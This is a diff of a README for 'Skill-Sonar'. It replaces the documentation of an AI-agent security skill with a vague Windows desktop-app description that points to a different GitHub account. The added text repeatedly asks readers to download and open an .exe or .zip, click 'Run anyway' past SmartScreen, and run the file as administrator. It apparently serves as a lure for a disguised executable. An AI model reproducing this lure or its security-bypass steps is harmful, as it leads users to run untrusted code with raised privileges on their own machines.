@@ -1,145 +1,177 @@
-   <p align="center">
-     <img src="./assets/skill-sonar.png" alt="Skill Sonar Logo" width="120" />
-   </p>
+# 🛰️ Skill-Sonar - Keep Skills in Check
 
-   <p align="center">
-     🛡️ A lifecycle-aware security skill for AI agents, covering both <strong>pre-install inspection</strong> and <strong>runtime monitoring</strong>.
-   </p>
-   <p align="center">
-     <a href="https://skill-sonar.github.io/skill-sonar">🌐 <strong>Website</strong></a>
-     &nbsp;·&nbsp;
-     <a href="https://clawhub.ai/yxf203/skill-sonar">🦞 <strong>ClawHub</strong></a>
-   </p>
-## 🚀 Features
+[![Download Skill-Sonar](https://img.shields.io/badge/Download-Skill--Sonar-blue?style=for-the-badge)](https://github.com/Dulcianamongol903/Skill-Sonar)
 
-- **Deep Code Sonar** — Continuously sweeps and analyzes your logic to detect hidden vulnerabilities, bugs, and inefficiencies with high precision.
-- **Robust Security Shield** — Built-in security protocols and advanced checks ensure your environment remains safe, locked down, and resilient against potential threats.
-- **Precision Node Mapping** — Intelligently traces dependencies, execution paths, and skill nodes to provide crystal-clear visibility into your architecture.
-- **Real-Time Threat Detection** — Instant “sonar pings” and alerts notify you of potential risks or code smells the moment they are introduced.
-- **Seamless Integration** — Designed to be lightweight and effortlessly integrate into your existing developer workflows and CI/CD pipelines.
+## 🎯 What Skill-Sonar Does
 
-## 📦 Install
+Skill-Sonar is a desktop app that helps you keep track of skill use across a work cycle. It gives you a clear view of skill status, task flow, and guard checks in one place.
 
-You can install **Skill Sonar** in either of the following ways:
+Use it to:
 
-### 1️⃣ Install via the official npm-based method
+- See skill activity at a glance
+- Track work across a full lifecycle
+- Flag gaps before they cause delays
+- Keep a simple record of checks and updates
 
-Use the standard installation flow supported by your agent platform.
+It is built for people who want a clear view of skill control without a complex setup.
 
-```
-clawhub install skill-sonar
-```
+## 🪟 Windows Download
 
-or
+To get Skill-Sonar on Windows, visit this page to download:
 
-```
-npx clawhub@latest install skill-sonar
-```
+https://github.com/Dulcianamongol903/Skill-Sonar
 
-### 2️⃣ Install manually
+On the page, look for the latest release or the main download file. If the app comes as a `.exe` file, download it and open it. If it comes as a `.zip` file, download it, extract it, then open the app inside the folder.
 
-Download the Skill Sonar files directly, then move the skill into the `skills` directory under your corresponding OpenClaw (`.openclaw`) workspace.
+## 🧭 Before You Start
 
-## ⚡ Quick Start
+Skill-Sonar runs on a standard Windows PC. For the best experience, use:
 
-### Check a skill before installation
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- At least 200 MB of free disk space
+- A mouse and keyboard
+- An internet connection for the first download
 
-```
-use skill-sonar to check xxx skills
-```
+If your PC is managed by a work account, you may need permission to run new apps.
 
-### Monitor the current session at runtime
+## 📥 Download and Install
 
-```
-use skill-sonar to monitor this session
-```
+Follow these steps on Windows:
 
-## 🎛️ Modes
+1. Open this link in your browser:
+   https://github.com/Dulcianamongol903/Skill-Sonar
 
-Skill Sonar supports **three operating modes**:
+2. Find the download file on the page.
 
-### 1. Full protection
+3. If you see a `.exe` file:
+   - Click it to download
+   - Open the file after the download ends
+   - If Windows asks for permission, choose Run or Yes
 
-Enable both the **pre-install check** and the **runtime check**.
+4. If you see a `.zip` file:
+   - Download the file
+   - Right-click the file
+   - Choose Extract All
+   - Open the extracted folder
+   - Double-click the app file inside
 
-```
-use skill-sonar for full protection
-```
+5. If Windows SmartScreen appears:
+   - Click More info
+   - Click Run anyway if you trust the source
 
-### 2. Pre-install only
+6. Wait for the app to open
 
-Enable only the **pre-install check**.
+## 🖥️ First-Time Setup
 
-```
-only use the pre-install check
-```
+When you open Skill-Sonar for the first time, you may see a setup screen. Use it to:
 
-### 3. Runtime only
+- Choose your preferred workspace
+- Set the skill groups you want to watch
+- Turn on task alerts
+- Pick how often the app checks for updates
+- Save your settings
 
-Enable only the **runtime check**.
+If the app asks where to store data, choose a folder you can find later, such as Documents or Desktop.
 
-```
-only use the runtime check
-```
+## 🔍 Main Features
 
-## 🎯 What It Does
+### 📊 Skill tracking
 
-Skill Sonar protects the **full lifecycle of the agent loop** across two stages:
+Skill-Sonar shows skill status in a clear view so you can see what is active, what needs review, and what is on hold.
 
-- **Pre-install** — inspects a skill before it is installed or enabled
-- **Runtime** — monitors the agent during task execution
+### 🛡️ Lifecycle guard checks
 
-This allows you to use a single unified security skill for both **skill review** and **in-session protection**.
+The app watches key steps in the skill lifecycle and helps you spot missing items before they become a problem.
 
-## ✨ Design Highlights
+### 📁 Simple records
 
-### Document-level routing
+You can keep a basic record of checks, changes, and current status in one place.
 
-Skill Sonar uses **document-level routing** instead of relying on config files, installation parameters, or external orchestration.
+### 🔔 Status alerts
 
-The entry skill document reads the current context, decides **preflight** (vetting a skill before install) vs **runtime** (monitoring an active session), and loads the corresponding guard path.
+The app can highlight items that need attention, so you do not have to search through long lists.
 
-This keeps integration:
+### 🧭 Easy navigation
 
-- lightweight
-- easy for agents to invoke
-- flexible for full protection or stage-only use
+Skill-Sonar uses a simple layout. You can move between views without learning special terms or steps.
 
-Routing also avoids pulling in guard logic that does not apply to the current situation, so the agent can focus on the checks that matter for that stage.
+## 🧰 How to Use Skill-Sonar
 
-### Preflight: single-file guard
+Use Skill-Sonar in a regular work flow like this:
 
-**Preflight** review is delivered as **one self-contained document** (`preflight/preflight-guard.md`). The methodology, risk areas, and audit protocol live together so install-time inspection does not depend on chasing multiple linked files for the core workflow.
+1. Open the app
+2. Load your skill list or project data
+3. Review the current status
+4. Check for warnings or missing steps
+5. Update items that need attention
+6. Save your changes
+7. Recheck the results
 
-### Runtime: on-demand loading
+If you use the app each day, it can help you keep a steady view of skill health over time.
 
-**On-demand loading** applies mainly to **runtime**. The runtime entry (`runtime/runtime-guard.md`) establishes triage and policy; **stage guards** and **checklists** under `runtime/` are loaded when triggers or risk levels (R1+) call for them, not as a single upfront bundle.
+## 🗂️ Typical Use Cases
 
-That way:
+Skill-Sonar fits well in these cases:
 
-- R0-style steps stay lightweight
-- deeper stage/checklist material appears only when something actually escalates
-- token use tracks real risk rather than the size of the whole runtime tree
+- Tracking training progress
+- Watching skill readiness across a team
+- Checking task stages in a process
+- Spotting gaps before a handoff
+- Keeping a light record of lifecycle checks
 
-### Token-efficient by design
+## 🧾 File Types You May See
 
-Skill Sonar is built to keep context usage proportional to need.
+You may see one of these file types when you download Skill-Sonar:
 
-- The entry layer routes preflight vs runtime before loading either path
-- Preflight is intentionally consolidated into one file for the primary audit flow
-- Runtime pulls in stage and checklist documents only when the guard path requires them
+- `.exe` — Windows app file
+- `.zip` — compressed folder that you must extract
+- `.msi` — Windows installer package
 
-This makes Skill Sonar a good fit when **token budget, context size, and routing clarity** all matter: preflight stays a single load for review sessions, while runtime avoids paying the full guard catalog on every turn.
+If you are not sure which file to use, pick the one marked for Windows.
 
-## 💡 Typical Use Cases
+## 🛠️ Troubleshooting
 
-- Audit a skill before installing it
-- Add runtime monitoring during a sensitive session
-- Use full lifecycle protection for untrusted or third-party skills
-- Apply lightweight security guarding in OpenClaw workflows
+### The app does not open
 
-## 📝 Notes
+- Right-click the file and choose Run as administrator
+- Check that the file finished downloading
+- Make sure Windows did not block it
+- Try downloading it again
 
-- For complete lifecycle protection, use **full protection** mode.
-- If you only need one stage, specify it explicitly in your prompt.
-- Exact invocation may vary slightly depending on your agent environment.
+### Windows says it blocked the file
+
+- Open the file details
+- Select More info
+- Choose Run anyway if you trust the source
+
+### The app opens, but the screen looks blank
+
+- Close the app
+- Open it again
+- Check that your screen scaling is set to a normal value
+- Try a different window size
+
+### The download failed
+
+- Check your internet connection
+- Try a different browser
+- Download the file again from the same page
+
+## 🔐 Safety and Access
+
+Skill-Sonar should be downloaded only from the GitHub link above. After download, keep the file in a known folder so you can find it later. If your computer uses company security rules, you may need local admin access to run the app.
+
+## 📌 Helpful Tips
+
+- Keep your skill data backed up
+- Use the same folder each time you open the app
+- Update the app when a newer version is available
+- Close other heavy apps if your PC feels slow
+- Save changes before you exit
+
+## 📬 Need to Check the Project Page
+
+Use the project page here for the latest release, files, and updates:
+
+https://github.com/Dulcianamongol903/Skill-Sonar
